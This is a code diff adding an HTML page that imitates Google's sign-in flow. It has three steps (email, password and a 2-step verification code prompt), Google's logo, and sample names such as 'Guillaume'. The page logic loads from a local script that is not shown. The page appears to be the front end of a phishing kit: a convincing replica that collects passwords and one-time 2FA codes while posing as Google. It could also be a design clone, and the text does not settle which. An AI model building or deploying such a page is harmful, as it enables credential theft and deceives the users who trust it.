@@ -1,0 +1,363 @@
+<!DOCTYPE>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="shortcut icon" href="//www.google.com/favicon.ico">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Sign in - Google Accounts</title>
+  <link href="https://fonts.googleapis.com/css?family=Google+Sans:400,400i,500,700" rel="stylesheet" type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,400i,500,700" rel="stylesheet" type='text/css'>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="css/loginStyle.css">
+</head>
+
+<body>
+  <div class="main-view">
+    <div class="main-container">
+      <div class="progress-row">
+        <div class="progress-bar hidden">
+          <div class="indeterminate"></div>
+        </div>
+      </div>
+
+      <!-- Email Page starts-->
+      <div class="input-container email-page ">
+        <div class="input-area">
+          <div class="google-logo">
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"
+              class="l5Lhkf">
+              <g id="qaEJec">
+                <path fill="#ea4335"
+                  d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z">
+                </path>
+              </g>
+              <g id="YGlOvc">
+                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
+              </g>
+              <g id="BWfIk">
+                <path fill="#4285f4"
+                  d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z">
+                </path>
+              </g>
+              <g id="e6m3fd">
+                <path fill="#fbbc05"
+                  d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z">
+                </path>
+              </g>
+              <g id="vbkDmc">
+                <path fill="#ea4335"
+                  d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z">
+                </path>
+              </g>
+              <g id="idEJde">
+                <path fill="#4285f4"
+                  d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z">
+                </path>
+              </g>
+            </svg>
+          </div>
+          <div class="heading-text">
+            Sign in
+          </div>
+          <div class="title-text">
+            Use your Google Account
+          </div>
+          <div class="input-box">
+            <div class="emailpassword-input">
+              <div class="email-wrapper">
+                <input id="email" class="input-user-name browser-default" type="text" class="validate" autofocus>
+                <label for="email" id="email-label" class="label-user-name">Email or phone</label>
+                <div class="input-border"></div>
+              </div>
+              <div class="email-empty-error hidden">
+                <span class="error-svg-wrapper">
+                  <svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px"
+                    height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                    <path
+                      d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z">
+                    </path>
+                  </svg>
+                </span>
+                Enter an email or phone number
+              </div>
+            </div>
+            <div class="forgot-email-wrapper">
+              <button class="btn-link">
+                Forgot email?
+              </button>
+            </div>
+            <div class="learn-more-wrapper">
+              <div class="learn-more-description">
+                Not your computer? Use Guest mode to sign in privately.
+                <button class="btn-link">
+                  Learn more
+                </button>
+              </div>
+            </div>
+            <div class="next-wrapper">
+              <button class="btn-link btn-create-account">
+                Create account
+              </button>
+              <button class="btn-next" onclick="next(1)">
+                <div class="label-next">
+                  Next
+                </div>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- Email Page ends -->
+
+      <!-- Password page starts-->
+      <div class="input-container password-page hidden">
+        <div class="input-area">
+          <div class="google-logo">
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"
+              class="l5Lhkf">
+              <g id="qaEJec">
+                <path fill="#ea4335"
+                  d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z">
+                </path>
+              </g>
+              <g id="YGlOvc">
+                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
+              </g>
+              <g id="BWfIk">
+                <path fill="#4285f4"
+                  d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z">
+                </path>
+              </g>
+              <g id="e6m3fd">
+                <path fill="#fbbc05"
+                  d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z">
+                </path>
+              </g>
+              <g id="vbkDmc">
+                <path fill="#ea4335"
+                  d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z">
+                </path>
+              </g>
+              <g id="idEJde">
+                <path fill="#4285f4"
+                  d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z">
+                </path>
+              </g>
+            </svg>
+          </div>
+          <div class="heading-text">
+            Hi Guillaume
+          </div>
+          <div class="email-address-view-wrapper">
+            <div class="email-address-view">
+              <div>
+                <img src="/img/face.svg">
+              </div>
+              <div class="email-address-label">
+                testmail@gmail.com
+              </div>
+              <div class="email-address-svg-wrapper">
+                <img src="./img/face.svg" alt="">
+              </div>
+            </div>
+          </div>
+          <div class="input-box">
+            <div class="emailpassword-input">
+              <div class="password-wrapper">
+                <input id="password" class="input-user-name browser-default" type="password" class="validate">
+                <label for="password" id="password-label" class="label-user-name">Enter your password</label>
+                <div class="password-visibility-area">
+                  <span class="password-hide hidden" aria-hidden="true" onclick="HidePassword(event)">
+                    <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="24px"
+                      height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                      <path
+                        d="M10.58,7.25l1.56,1.56c1.38,0.07,2.47,1.17,2.54,2.54l1.56,1.56C16.4,12.47,16.5,12,16.5,11.5C16.5,9.02,14.48,7,12,7 C11.5,7,11.03,7.1,10.58,7.25z">
+                      </path>
+                      <path
+                        d="M12,6c3.79,0,7.17,2.13,8.82,5.5c-0.64,1.32-1.56,2.44-2.66,3.33l1.42,1.42c1.51-1.26,2.7-2.89,3.43-4.74 C21.27,7.11,17,4,12,4c-1.4,0-2.73,0.25-3.98,0.7L9.63,6.3C10.4,6.12,11.19,6,12,6z">
+                      </path>
+                      <path
+                        d="M16.43,15.93l-1.25-1.25l-1.27-1.27l-3.82-3.82L8.82,8.32L7.57,7.07L6.09,5.59L3.31,2.81L1.89,4.22l2.53,2.53 C2.92,8.02,1.73,9.64,1,11.5C2.73,15.89,7,19,12,19c1.4,0,2.73-0.25,3.98-0.7l4.3,4.3l1.41-1.41l-3.78-3.78L16.43,15.93z M11.86,14.19c-1.38-0.07-2.47-1.17-2.54-2.54L11.86,14.19z M12,17c-3.79,0-7.17-2.13-8.82-5.5c0.64-1.32,1.56-2.44,2.66-3.33 l1.91,1.91C7.6,10.53,7.5,11,7.5,11.5c0,2.48,2.02,4.5,4.5,4.5c0.5,0,0.97-0.1,1.42-0.25l0.95,0.95C13.6,16.88,12.81,17,12,17z">
+                      </path>
+                    </svg>
+                  </span>
+                  <span class="password-show" aria-hidden="true" onclick="ShowPassword(event)">
+                    <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="24px"
+                      height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                      <path
+                        d="M12,7c-2.48,0-4.5,2.02-4.5,4.5S9.52,16,12,16s4.5-2.02,4.5-4.5S14.48,7,12,7z M12,14.2c-1.49,0-2.7-1.21-2.7-2.7 c0-1.49,1.21-2.7,2.7-2.7s2.7,1.21,2.7,2.7C14.7,12.99,13.49,14.2,12,14.2z">
+                      </path>
+                      <path
+                        d="M12,4C7,4,2.73,7.11,1,11.5C2.73,15.89,7,19,12,19s9.27-3.11,11-7.5C21.27,7.11,17,4,12,4z M12,17 c-3.79,0-7.17-2.13-8.82-5.5C4.83,8.13,8.21,6,12,6s7.17,2.13,8.82,5.5C19.17,14.87,15.79,17,12,17z">
+                      </path>
+                    </svg>
+                  </span>
+                </div>
+                <div class="input-border"></div>
+              </div>
+            </div>
+            <div class="password-empty-error hidden">
+              <span class="error-svg-wrapper">
+                <svg aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px"
+                  height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                  <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z">
+                  </path>
+                </svg>
+              </span>
+              Enter valid password
+            </div>
+            <div class="password-next-wrapper">
+              <button class="btn-link btn-create-account">
+                Forgot password?
+              </button>
+              <button class="btn-next" onclick="next(2)">
+                <div class="label-next">
+                  Next
+                </div>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- Password page ends -->
+
+      <!-- 2 steps Authentication page starts -->
+      <div class="input-container 2steps-authentication hidden">
+        <div class="input-area">
+          <!-- Logo -->
+          <div class="google-logo">
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"
+              class="l5Lhkf">
+              <g id="qaEJec">
+                <path fill="#ea4335"
+                  d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z">
+                </path>
+              </g>
+              <g id="YGlOvc">
+                <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
+              </g>
+              <g id="BWfIk">
+                <path fill="#4285f4"
+                  d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z">
+                </path>
+              </g>
+              <g id="e6m3fd">
+                <path fill="#fbbc05"
+                  d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z">
+                </path>
+              </g>
+              <g id="vbkDmc">
+                <path fill="#ea4335"
+                  d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z">
+                </path>
+              </g>
+              <g id="idEJde">
+                <path fill="#4285f4"
+                  d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z">
+                </path>
+              </g>
+            </svg>
+          </div>
+          <!-- Logo ends -->
+
+          <!-- Input body -->
+          <div class="input-body">
+            <div class="input-header">
+              <div class="heading-text">
+                2-step Verification
+                <div class="heading-text-subtitle">
+                  <span>This extra step shows that it’s really you trying to sign in</span>
+                </div>
+              </div>
+              <!-- Account -->
+              <div class="email-address-view-wrapper">
+                <div class="email-address-view">
+                  <div>
+                    <img src="./img/face.svg" alt="">
+                  </div>
+                  <div class="email-address-label">
+                    guillaume@gmail.com
+                  </div>
+                  <div class="email-address-svg-wrapper">
+                    <svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px"
+                      viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                      <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+                    </svg>
+                  </div>
+                </div>
+              </div>
+              <!-- End Account -->
+            </div>
+
+            <div class="input-box">
+              <div class="verification-area">
+                <div class="verification-heading">
+                  <h2>2-step Verification</h2>
+                </div>
+                <div class="verification-form">
+                  <div class="verification-message">
+                    A text message with a 6-digit verification code was just sent to <span>•• ••• •• 37</span>
+                  </div>
+                  <div class="verification-input">
+                    <div class="code-box">
+                      <span class="G">G-</span>
+                      <div class="code-input">
+                        <input id="verification-code" class="input-user-name browser-default" type="password"
+                          class="validate" autofocus>
+                        <label for="verification-code" id="code-label" class="label-user-name">Enter the code</label>
+                      </div>
+                      <div class="input-border"></div>
+                    </div>
+                  </div>
+                  <div class="term-info">
+                    <input type="checkbox" id="agree" name="agree" value="Bike">
+                    <label for="agree"> Don't ask again on this computer</label>
+                  </div>
+                </div>
+              </div>
+
+              <div class="authentication-next-wrapper">
+                <button class="btn-link btn-create-account">
+                  Try another way
+                </button>
+                <button class="btn-next">
+                  <div class="label-next">
+                    Next
+                  </div>
+                </button>
+              </div>
+            </div>
+          </div>
+          <!-- Input body ends-->
+        </div>
+      </div>
+      <!-- 2 steps Authentication page ends -->
+
+      <!-- Footer -->
+      <footer class="footer">
+        <div class="language-selection">
+          English (United States)
+          <div class="language-list-mark">
+          </div>
+        </div>
+        <ul class="footer-links-wrapper">
+          <li class="footer-link">
+            <a href="https://support.google.com/accounts?hl=en" target="_blank">Help</a>
+          </li>
+          <li class="footer-link">
+            <a href="https://accounts.google.com/TOS?loc=RU&amp;hl=en&amp;privacy=true" target="_blank">Privacy</a>
+          </li>
+          <li class="footer-link">
+            <a href="https://accounts.google.com/TOS?loc=RU&amp;hl=en" target="_blank">Terms</a>
+          </li>
+        </ul>
+      </footer>
+    </div>
+  </div>
+  <script type="text/javascript" src="js/loginScript.js"></script>
+</body>
+
+</html>
